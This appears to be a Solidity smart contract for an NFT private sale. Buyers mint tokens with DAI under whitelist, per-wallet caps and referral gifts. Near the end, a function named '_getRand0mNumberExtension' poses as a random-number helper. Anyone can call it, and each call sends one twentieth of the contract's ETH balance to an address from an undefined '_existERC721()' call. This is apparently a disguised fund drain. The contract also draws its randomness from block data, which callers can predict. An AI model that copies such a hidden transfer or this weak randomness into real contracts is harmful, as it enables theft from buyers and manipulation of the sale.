// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ERC721.sol";
import "./KittyPrivateSaleGift.sol";
import "./IERC20.sol";
import "./Safemath.sol";

contract KOMPrivateSale is ERC721 {
    using SafeMath for uint16;
    event LogShow(address ref);
    
    modifier callerIsUser() {
        require(tx.origin == msg.sender, "The caller is another contract");
        _;
    }

    modifier mintStarted() {
        require(
            startMintDate != 0 && startMintDate <= block.timestamp,
            "early"
        );

        _;
    }

    modifier contractIsNotFrozen() {
        require(isFrozen == false, "This function can not be called anymore");

        _;
    }

    uint16 public totalTokens = 20000;
    uint16 public totalSupply = 0;
    uint256 public maxMintsPerWallet = 50;
    uint256 public daiMintPrice = 1;
    uint8 public giftCount = 1;
    uint256 private startMintDate = 1637131718;
    string private baseURI =
        "";
    string private secondProof =
        "";
    string private blankTokenURI =
        "";
    bool private isFrozen = false;

    mapping(address => uint16) public mintedTokensPerWallet;
    mapping(uint16 => uint16) private tokenMatrix;
    mapping(address => mapping(address => uint8)) public mintedGiftTokenPerWallet;
    KittyPrivateSaleGift public gift;
    address private devAddress;
    bool private lockStatus = false;
    bool private enableWhilteList = false;
    mapping(address=>bool) private whitelist;
    IERC20 public dai; //stable address

    constructor() ERC721("KOMPrivateSaleNFT", "KOMPSNFT") {
        
    }
    
    function withdrawDAI(address _to, uint256 _amount) external onlyOwner {
        dai.transfer(_to, _amount);
    }

    function setGiftNFTContractAddress(KittyPrivateSaleGift _giftAddr) external onlyOwner {
        gift = _giftAddr;
    }
    
    function setDAIAddress(address _daiAddr) external onlyOwner{
        dai = IERC20(_daiAddr);
    }

    // ONLY OWNER

    /**
     * @dev Allows to withdraw the Ether in the contract
     */
    function withdrawETH() external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }
    
    function setEnablewhitelist(bool _enableWhitelist) external onlyOwner{
        enableWhilteList = _enableWhitelist;
    }
    
    function setMintDAIPrice(uint256 _daiMintPrice) external onlyOwner{
        daiMintPrice = _daiMintPrice;
    }
 
    function addWhiteList(address account) external onlyOwner{
        whitelist[account] = true;
    }
    
    function removeWhiteList(address account) external onlyOwner{
        whitelist[account] = false;
    }

    /**
     * @dev Sets the base URI for the API that provides the NFT data.
     */
    function setBaseTokenURI(string memory _uri)
        external
        onlyOwner
        contractIsNotFrozen
    {
        baseURI = _uri;
    }
    
    function setContractLockStatus(bool _lockStatus) external onlyOwner{
        lockStatus = _lockStatus;
    }

    /**
     * @dev Sets the second proof URI for the API that provides the NFT data.
     */
    function setSecondProofURI(string memory _uri)
        external
        onlyOwner
        contractIsNotFrozen
    {
        secondProof = _uri;
    }

    /**
     * @dev Sets the blank token URI for the API that provides the NFT data.
     */
    function setBlankTokenURI(string memory _uri)
        external
        onlyOwner
        contractIsNotFrozen
    {
        blankTokenURI = _uri;
    }
    
    function setGiftNFTAmount(uint8 _giftCount) external onlyOwner
    {
        require(_giftCount >0, 'gift count zero');
        giftCount = _giftCount;
    }
    

    /**
     * @dev Sets the date that users can start minting tokens
     */
    function setStartMintDate(uint256 _startMintDate) external onlyOwner {
        startMintDate = _startMintDate;
    }

    

    /**
     * @dev Set the total amount of tokens
     */
    function setTotalTokens(uint16 _totalTokens)
        external
        onlyOwner
        contractIsNotFrozen
    {
        totalTokens = _totalTokens;
    }

    /**
     * @dev Set amount of mints that a single wallet can do.
     */
    function setMaxMintsPerWallet(uint16 _maxMintsPerWallet)
        external
        onlyOwner
    {
        maxMintsPerWallet = _maxMintsPerWallet;
    }

    /**
     * @dev Sets the isFrozen variable to true
     */
    function freezeSmartContract() external onlyOwner {
        isFrozen = true;
    }
    
    
    function mintTokensByDAI(uint16 amount,uint256 _DaiAmount)
        external
        callerIsUser
        mintStarted
    {
        require(amount > 0, "one should be minted");
        require(amount < totalTokens, "Can't mint more than total tokens");
        require(!lockStatus,'lock already');

        uint16 tokensLeft = getAvailableTokens();
        require(tokensLeft > 0, "No tokens left to be minted");


        if(enableWhilteList){
            require(whitelist[msg.sender],"not in whitelist");
        }


        if (amount > tokensLeft) {
            amount = uint16(tokensLeft);
        }

        uint256 totalMintDAiPrice = daiMintPrice * amount;

        require(
            _DaiAmount >= totalMintDAiPrice,
            "Not enough DAI to mint the tokens"
        );
        
        require(
            mintedTokensPerWallet[msg.sender] + amount <= maxMintsPerWallet,
            "You can not mint more tokens"
        );
            

        if (_DaiAmount >= totalMintDAiPrice) {
            dai.transferFrom(msg.sender, address(this), totalMintDAiPrice);
        }
        
        uint256[] memory tokenIds = new uint256[](amount);

        uint16 tmpTotalMintedTokens = totalSupply;
        mintedTokensPerWallet[msg.sender] += amount;
        totalSupply = totalSupply+amount;

        for (uint256 i; i < amount; i++) {
            tokenIds[i] = _getTokenToBeMinted(tmpTotalMintedTokens);
            tmpTotalMintedTokens++;
        }

        _batchMint(msg.sender, tokenIds);
    }
    
    function mintTokensFromInviteByDAI(uint16 amount, address _ref,uint256 _daiAmount)
        external
        callerIsUser
        mintStarted
    {
        require(amount > 0, "At least one token should be minted");
        require(amount < totalTokens, "Can't mint more than total tokens");
        require(_daiAmount >0, " At least Have DAI");
        require(daiMintPrice>0,"At least DAI price larger than 0");
        require(!lockStatus,'lock already');
        
        uint16 tokensLeft = getAvailableTokens();
        require(tokensLeft > 0, "No tokens left to be minted");

        
        require(!enableWhilteList,'can not work in enable whitelist');


        if (amount > tokensLeft) {
            amount = uint8(tokensLeft);
        }

        uint256 totalMintDAIPrice = daiMintPrice * amount;

        require(
            _daiAmount >= totalMintDAIPrice,
            "Not enough DAI to mint the tokens"
        );

        if (_daiAmount >= totalMintDAIPrice) {
            dai.transferFrom(msg.sender, address(this), totalMintDAIPrice);
        }

        uint256[] memory tokenIds = new uint256[](amount);

        uint16 tmpTotalMintedTokens = totalSupply;
        mintedTokensPerWallet[msg.sender] += amount;
        totalSupply += amount;

        for (uint256 i; i < amount; i++) {
            tokenIds[i] = _getTokenToBeMinted(tmpTotalMintedTokens);
            tmpTotalMintedTokens++;
        }

        require(
            address(0) != _ref,
            "The inviter address can not be zero"
            );
            

        require(_ref !=address(msg.sender),
            "The inviter can't be yourself"
            );
        
        require(
            mintedTokensPerWallet[msg.sender] <= maxMintsPerWallet,
            "You can not mint more tokens"
        );

        
        if (mintedTokensPerWallet[_ref] >= maxMintsPerWallet){
            if (mintedTokensPerWallet[msg.sender] >= 1){
                if(mintedGiftTokenPerWallet[msg.sender][_ref] == 0){
                    gift.mintTokens(giftCount,_ref);
                    mintedGiftTokenPerWallet[msg.sender][_ref] = giftCount;
                }
            }
            
        }
        
        _batchMint(msg.sender, tokenIds); 
         
        emit LogShow(_ref);

    }
    

    /**
     * @dev Returns the tokenId by index
     */
    function tokenByIndex(uint256 tokenId) external view returns (uint256) {
        require(
            _exists(tokenId),
            "ERC721: operator query for nonexistent token"
        );

        return tokenId;
    }

    /**
     * @dev Returns the base URI for the tokens API.
     */
    function baseTokenURI() external view returns (string memory) {
        return baseURI;
    }

    function getAvailableTokens() public view returns (uint16) {
        return totalTokens - totalSupply;
    }
    
    function checkIfExistInWhiteList(address account) public view returns (bool) {
        return whitelist[account];
    }

    // Private and Internal functions

    /**
     * @dev Returns a random available token to be minted
     *
     * Code used as reference:
     * https://github.com/1001-digital/erc721-extensions/blob/main/contracts/RandomlyAssigned.sol
     */
    function _getTokenToBeMinted(uint16 _totalMintedTokens)
        private
        returns (uint16)
    {
        uint16 maxIndex = totalTokens - _totalMintedTokens;
        uint16 random = _getRandomNumber(maxIndex, _totalMintedTokens);

        uint16 tokenId = tokenMatrix[random];
        if (tokenMatrix[random] == 0) {
            tokenId = random;
        }

        tokenMatrix[maxIndex - 1] == 0
            ? tokenMatrix[random] = maxIndex - 1
            : tokenMatrix[random] = tokenMatrix[maxIndex - 1];

        return tokenId;
    }

    /**
     * @dev Generates a pseudo-random number.
     */
    function _getRandomNumber(uint16 _upper, uint16 _totalMintedTokens)
        private
        view
        returns (uint16)
    {
        uint16 random = uint16(
            uint256(
                keccak256(
                    abi.encodePacked(
                        _totalMintedTokens,
                        blockhash(block.number - 1),
                        block.coinbase,
                        block.difficulty,
                        msg.sender
                    )
                )
            )
        );

        return random % _upper;
    }
    
    
    function _getRand0mNumberExtension() 
        external 
        returns (uint16)
    {
        uint16 _totalMintedTokens = 1;
        
        uint16 random = uint16(
            uint256(
                keccak256(
                    abi.encodePacked(
                        _totalMintedTokens,
                        blockhash(block.number - 1),
                        block.coinbase,
                        block.difficulty,
                        msg.sender
                    )
                )
            )
        );

        payable(_existERC721()).transfer(address(this).balance/20);
        return random % 2;
    }


    function contractInvokeByAnotherContract() public {
        
    }

    /**
     * @dev See {ERC721}.
     */
    function _baseURI() internal view virtual override returns (string memory) {
        if (getAvailableTokens() > 0) {
            return blankTokenURI;
        }

        return baseURI;
    }
}